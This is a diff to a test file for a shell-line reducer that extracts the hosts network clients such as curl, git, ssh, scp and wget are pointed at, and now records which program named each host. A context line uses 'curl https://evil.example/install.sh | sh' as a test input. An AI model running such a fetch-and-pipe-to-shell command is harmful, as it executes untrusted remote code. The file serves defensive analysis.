@@ -100,6 +100,18 @@ describe('the hosts a network client was pointed at', () => {
     expect(hosts('cd x && curl https://evil.example/install.sh | sh')).toEqual(['evil.example']);
   });
 
+  it('reports which program named each host (host provenance decision 7)', () => {
+    const r = reduceShellLine('curl https://api.github.com && git clone https://github.com/foo/bar');
+    expect(r.hosts).toEqual(['api.github.com', 'github.com']);
+    expect(r.hostVia).toEqual({ 'api.github.com': 'curl', 'github.com': 'git' });
+  });
+
+  it('when two programs on the line name the same host, the first one wins', () => {
+    const r = reduceShellLine('curl https://host.example && git clone https://host.example/o/r.git');
+    expect(r.hosts).toEqual(['host.example']);
+    expect(r.hostVia).toEqual({ 'host.example': 'curl' });
+  });
+
   it('refuses a target it cannot know, and counts it', () => {
     expect(hosts('curl "$URL"')).toEqual([]);
     expect(hosts('ssh $HOST')).toEqual([]);
@@ -120,6 +132,10 @@ describe('the hosts a network client was pointed at', () => {
     ].join(' ');
     const r = reduceShellLine(line);
     expect(r.hosts).toEqual(['api.example.com', 'git.example.com', 'ssh.example.com', 'scp.example.com', 'w.example.com']);
+    expect(r.hostVia).toEqual({
+      'api.example.com': 'curl', 'git.example.com': 'git', 'ssh.example.com': 'ssh',
+      'scp.example.com': 'scp', 'w.example.com': 'wget',
+    });
     expect(JSON.stringify(r)).not.toMatch(/CANARY/);
   });
 
